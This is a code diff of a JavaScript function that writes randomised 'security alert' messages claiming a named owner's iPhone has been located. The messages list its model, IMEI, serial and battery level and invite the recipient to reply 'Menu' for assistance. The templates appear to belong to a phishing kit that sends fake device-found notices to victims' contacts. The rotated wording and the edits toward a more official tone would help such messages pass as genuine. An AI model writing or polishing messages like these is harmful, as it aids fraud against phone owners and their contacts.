@@ -200,34 +200,28 @@ ${random(helpPhrases)}
 ${random(closings)}`;
       
     } else {
-      // Emergency contact message in English
+      // Emergency contact message in English - CONCISE and professional
       const openings = [
-        "🚨 Emergency contact alert",
-        "⚠️ Automatic security notification",
-        "🔔 Alert system activated"
+        "🛡️ Security alert",
+        "🔐 Security notification",
+        "🔒 Protection system activated"
       ];
       
       const detectionPhrases = [
-        `Device belonging to **${process.owner_name || 'registered user'}** has been detected.\n\nDate: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nStatus: Located ✅\n\nCase ID: ${caseId}\nClient ID: ${clientId}`,
-        `Equipment owned by **${process.owner_name || 'registered user'}** located.\n\nRecord: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nStatus: Online ✅\n\nCase: ${caseId}\nClient: ${clientId}`,
-        `Device from **${process.owner_name || 'registered user'}** tracked successfully.\n\nTime: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nStatus: Active ✅\n\nReference: ${caseId}\nUser: ${clientId}`
-      ];
-      
-      const emergencyPhrases = [
-        "**Automatic message sent to emergency contacts**",
-        "**Notification directed to security contact network**",
-        "**Alert generated for verified contacts**"
+        `Date: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nDevice belonging to **${process.owner_name || 'registered user'}** has been located.\nStatus: Online ✅\n\nCase ID: ${caseId}`,
+        `Record: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nEquipment owned by **${process.owner_name || 'registered user'}** detected.\nStatus: Operational ✅\n\nCase: ${caseId}`,
+        `Time: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nDevice from **${process.owner_name || 'registered user'}** tracked.\nStatus: Active ✅\n\nReference: ${caseId}`
       ];
       
       const deviceSections = [
-        `**Device information:**
+        `Device details:
 • Model: ${process.iphone_model}
 • Color: ${process.color} | Storage: ${process.storage}
 • IMEI: ${process.imei}
 • Serial: ${process.serial_number}
 • Battery: ${battery}%`,
         
-        `**Equipment details:**
+        `Equipment information:
 • Device: ${process.iphone_model}
 • Color: ${process.color} | Capacity: ${process.storage}
 • IMEI Code: ${process.imei}
@@ -235,44 +229,33 @@ ${random(closings)}`;
 • Battery level: ${battery}%`
       ];
       
-      const contactPhrases = [
-        `**You are an emergency contact for ${process.owner_name || 'this device'}**`,
-        `**You are part of the emergency network for ${process.owner_name || 'this user'}**`,
-        `**You are registered as a security contact for ${process.owner_name || 'this equipment'}**`
-      ];
-      
       const instructionPhrases = [
-        "**IMPORTANT**: Please inform the owner that their device was located.",
-        "**ACTION REQUIRED**: Notify the owner that their device has been found.",
-        "**NOTICE**: Communicate to the owner that their equipment was detected."
+        "Please inform the owner that their device was located.",
+        "Notify the owner that their device has been found.",
+        "Communicate to the owner that their equipment was detected."
       ];
       
       const helpPhrases = [
-        "For immediate assistance *Reply* **Menu**",
-        "For technical support *Write* **Menu**",
-        "For specialized help *Send* **Menu**"
+        "Need help? Write *Menu* for technical assistance 👨‍💻",
+        "Require support? Reply *Menu* for specialized help 🔧",
+        "Looking for assistance? Send *Menu* to contact support 👩‍💻"
       ];
       
       const closings = [
-        "Emergency system – 24/7 service",
-        "Security network – Continuous attention",
-        "Alert protocol – Permanent monitoring"
+        "Automated service – 24 h assistance available",
+        "Automatic system – 24/7 active support",
+        "Continuous monitoring – Permanent assistance"
       ];
       
       return `${random(openings)}
 
 ${random(detectionPhrases)}
 
-${random(emergencyPhrases)}
-
 ${random(deviceSections)}
-
-${random(contactPhrases)}
 
 ${random(instructionPhrases)}
 
 ${random(helpPhrases)}
-
 ${random(closings)}`;
     }
   }
